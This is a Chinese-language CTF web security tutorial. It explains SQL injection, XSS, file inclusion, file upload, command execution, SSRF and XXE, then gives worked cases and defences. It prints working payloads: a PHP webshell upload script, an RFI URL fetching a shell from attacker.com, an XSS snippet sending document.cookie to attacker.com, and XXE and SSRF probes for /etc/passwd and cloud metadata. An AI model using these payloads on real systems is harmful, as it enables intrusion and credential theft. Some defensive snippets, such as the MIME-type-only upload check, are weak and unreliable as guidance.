# CTF Web安全详解

## 概述

CTF（Capture The Flag）竞赛中的Web安全方向主要涉及Web应用程序的安全漏洞挖掘和利用。Web安全是CTF竞赛中最常见也是最活跃的方向之一，涵盖了从基础的SQL注入到复杂的逻辑漏洞等多种攻击技术。

## Web安全基础知识

### HTTP协议基础

```python
# HTTP请求示例
GET /index.php?id=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123

# HTTP响应示例
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=def456
Content-Length: 1234

<html>...</html>
```

### 常见HTTP方法
- **GET**：获取资源
- **POST**：提交数据
- **PUT**：更新资源
- **DELETE**：删除资源
- **HEAD**：获取响应头
- **OPTIONS**：查询服务器支持的方法

### HTTP状态码
- **2xx**：成功（200 OK, 201 Created）
- **3xx**：重定向（301 Moved Permanently, 302 Found）
- **4xx**：客户端错误（404 Not Found, 403 Forbidden）
- **5xx**：服务器错误（500 Internal Server Error）

## 常见Web漏洞类型

### 1. SQL注入（SQL Injection）

#### 原理
通过构造恶意SQL语句，绕过应用程序的输入验证，直接操作数据库。

#### 示例
```sql
-- 原始查询
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- 注入攻击
username: admin' OR '1'='1
password: anything

-- 最终查询
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```

#### 检测方法
```python
# 使用Python检测SQL注入
def test_sql_injection(url, param):
    payloads = ["'", "' OR '1'='1", "'; --", "' UNION SELECT"]
    
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        
        # 检测错误信息或异常行为
        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"可能存在SQL注入: {payload}")
            return True
    
    return False
```

### 2. 跨站脚本（XSS）

#### 类型
- **反射型XSS**：恶意脚本通过URL参数传递
- **存储型XSS**：恶意脚本存储在服务器上
- **DOM型XSS**：通过修改DOM树执行恶意脚本

#### 示例
```html
<!-- 反射型XSS示例 -->
<script>alert('XSS')</script>

<!-- 存储型XSS示例 -->
<img src=x onerror=alert('XSS')>

<!-- DOM型XSS示例 -->
<a href="javascript:alert('XSS')">点击</a>
```

### 3. 文件包含漏洞

#### 本地文件包含（LFI）
```php
<?php
// 漏洞代码
$file = $_GET['file'];
include($file);
?>

<!-- 利用 -->
http://example.com/index.php?file=../../etc/passwd
```

#### 远程文件包含（RFI）
```php
<?php
// 漏洞代码（allow_url_include=On）
$file = $_GET['file'];
include($file);
?>

<!-- 利用 -->
http://example.com/index.php?file=http://attacker.com/shell.txt
```

### 4. 文件上传漏洞

#### 常见绕过方法
- 修改文件扩展名（.php → .phtml, .php5）
- 添加特殊字符（shell.php.）
- 修改Content-Type
- 双扩展名（shell.jpg.php）

#### 检测脚本
```python
def test_file_upload(url, file_param):
    # 测试各种文件类型
    test_files = [
        ('shell.php', 'application/x-php'),
        ('shell.phtml', 'text/html'),
        ('shell.php5', 'application/x-php'),
        ('shell.jpg.php', 'image/jpeg')
    ]
    
    for filename, content_type in test_files:
        files = {file_param: (filename, '<?php system("id"); ?>', content_type)}
        response = requests.post(url, files=files)
        
        if response.status_code == 200:
            print(f"可能上传成功: {filename}")
```

### 5. 命令执行漏洞

#### 原理
应用程序未正确过滤用户输入，导致系统命令被执行。

#### 示例
```php
<?php
// 漏洞代码
$cmd = $_GET['cmd'];
system($cmd);
?>

<!-- 利用 -->
http://example.com/exec.php?cmd=ls%20-la
```

### 6. SSRF（服务器端请求伪造）

#### 原理
攻击者诱导服务器向内部或外部系统发起请求。

#### 利用场景
- 访问内部服务（127.0.0.1:3306）
- 读取本地文件（file:///etc/passwd）
- 端口扫描

#### 示例
```python
# SSRF检测脚本
def test_ssrf(url, param):
    targets = [
        "http://127.0.0.1:3306",
        "file:///etc/passwd",
        "http://169.254.169.254/latest/meta-data/"
    ]
    
    for target in targets:
        test_url = f"{url}?{param}={target}"
        response = requests.get(test_url)
        
        if "mysql" in response.text or "root:" in response.text:
            print(f"SSRF漏洞存在: {target}")
```

### 7. XXE（XML外部实体注入）

#### 原理
通过XML解析器加载外部实体。

#### 示例
```xml
<!-- 恶意XML -->
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

## CTF Web题目类型

### 1. 基础题目
- **SQL注入**：简单的注入获取flag
- **XSS**：盗取cookie或执行特定操作
- **文件上传**：上传webshell获取权限

### 2. 进阶题目
- **代码审计**：分析源码寻找漏洞
- **反序列化**：利用反序列化漏洞
- **逻辑漏洞**：业务流程中的安全缺陷

### 3. 综合题目
- **多阶段攻击**：需要多个漏洞组合利用
- **权限提升**：从低权限到高权限的跨越
- **代码混淆**：需要逆向分析代码逻辑

## 常用工具

### 扫描工具
```bash
# SQLMap - SQL注入检测
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Nikto - Web漏洞扫描
nikto -h http://example.com

# Dirb - 目录爆破
dirb http://example.com
```

### 代理工具
```bash
# Burp Suite - 功能强大的Web代理
# 设置代理：127.0.0.1:8080

# OWASP ZAP - 开源Web应用扫描器
zap.sh -daemon -port 8080 -host 127.0.0.1
```

### 开发工具
```python
# Python requests库
import requests

# 基础请求示例
session = requests.Session()
response = session.get('http://example.com/login')

# 带Cookie的请求
cookies = {'session': 'abc123'}
response = session.get('http://example.com/admin', cookies=cookies)
```

## CTF Web解题流程

### 1. 信息收集
```python
def information_gathering(target):
    # WHOIS查询
    # 子域名枚举
    # 端口扫描
    # 技术栈识别
    pass
```

### 2. 漏洞探测
```python
def vulnerability_scanning(target):
    # 自动化扫描
    # 手动测试
    # 参数fuzzing
    pass
```

### 3. 漏洞利用
```python
def exploit_vulnerability(target, vulnerability):
    # 构造payload
    # 执行攻击
    # 获取flag
    pass
```

### 4. 权限维持
```python
def maintain_access(target):
    # 上传webshell
    # 建立持久连接
    # 清理痕迹
    pass
```

## 实战案例

### 案例1：SQL注入获取管理员密码
```python
import requests

def sql_injection_example():
    url = "http://ctf.example.com/login.php"
    
    # 探测注入点
    payload = "admin' AND 1=1 -- "
    data = {'username': payload, 'password': 'test'}
    
    response = requests.post(url, data=data)
    
    if "登录成功" in response.text:
        print("存在SQL注入漏洞")
        
        # 利用Union查询获取数据
        payload = "admin' UNION SELECT 1,password,3 FROM users WHERE username='admin' -- "
        data = {'username': payload, 'password': 'test'}
        
        response = requests.post(url, data=data)
        # 解析响应获取密码
        print("管理员密码:", extract_password(response.text))

def extract_password(html):
    # 从HTML中提取密码的逻辑
    pass
```

### 案例2：文件上传获取webshell
```python
def file_upload_example():
    url = "http://ctf.example.com/upload.php"
    
    # 构造webshell
    webshell = "<?php system($_GET['cmd']); ?>"
    
    files = {
        'file': ('shell.php', webshell, 'application/x-php')
    }
    
    response = requests.post(url, files=files)
    
    if "上传成功" in response.text:
        # 获取上传路径
        upload_path = parse_upload_path(response.text)
        
        # 执行命令
        cmd_url = f"http://ctf.example.com/uploads/{upload_path}?cmd=cat%20/flag"
        flag_response = requests.get(cmd_url)
        
        print("Flag:", flag_response.text)

def parse_upload_path(html):
    # 解析上传文件路径的逻辑
    pass
```

### 案例3：XSS盗取管理员Cookie
```html
<!-- 存储型XSS利用 -->
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- 反射型XSS利用 -->
http://ctf.example.com/search.php?q=<script>alert(document.cookie)</script>
```

## 防御措施

### 1. 输入验证
```php
<?php
// 安全的输入处理
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);

// 使用预处理语句防止SQL注入
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
?>
```

### 2. 输出编码
```php
<?php
// 防止XSS
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
?>
```

### 3. 文件上传安全
```php
<?php
// 安全的文件上传
$allowed_types = ['image/jpeg', 'image/png'];
$max_size = 1024 * 1024; // 1MB

if (in_array($_FILES['file']['type'], $allowed_types) && 
    $_FILES['file']['size'] <= $max_size) {
    // 处理上传
}
?>
```

## 学习资源


### 书籍推荐
- 《Web安全深度剖析》
- 《白帽子讲Web安全》
- 《黑客攻防技术宝典：Web实战篇》


## 总结

CTF Web安全是一个需要不断学习和实践的领域。通过掌握各种漏洞原理、熟练使用安全工具、积累实战经验，你可以在CTF竞赛中取得优异的成绩。记住，Web安全不仅仅是技术问题，更是思维方式和逻辑分析能力的体现。

**关键要点：**
1. 理解漏洞原理比记住payload更重要
2. 工具只是辅助，手动测试能力是核心
3. 保持好奇心，勇于尝试新的攻击方法
4. 重视防御措施，理解攻击才能更好防御
5. 持续学习，Web安全技术日新月异

祝你在CTF Web安全的道路上越走越远！